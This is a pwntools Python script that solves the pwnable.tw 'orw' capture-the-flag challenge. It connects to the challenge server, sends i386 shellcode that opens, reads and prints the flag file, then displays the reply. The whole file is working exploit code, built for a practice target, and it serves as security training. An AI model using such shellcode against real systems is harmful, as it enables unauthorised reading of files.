from pwn import *

def solve():
    # elf = ELF("orw")
    # target = elf.process()
    # gdb.attach(target, "b main")

    context(os="linux", arch="i386")

    target = remote("chall.pwnable.tw", 10001)

    shell_code = asm('\n'.join([
    # Open file
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'), # Flag path
    'mov edx, 0',   # Mode
    'mov ecx, 0',   # Open syscall flag
    'mov ebx, esp', # Buffer
    'mov eax, 5',   # Open syscall number
    'int 0x80',

    # Read file
    'mov edx, 128', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, eax', # fd
    'mov eax, 3',   # Read syscall number
    'int 0x80',

    # Frite to stdout
    'mov edx, eax', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 1',   # fd
    'mov eax, 4',   # Write syscall number
    'int 0x80',
    ]))

    target.sendafter(b":", shell_code)
    print("Payload sent")
    print(target.recvall())

if __name__ == "__main__":
    solve()
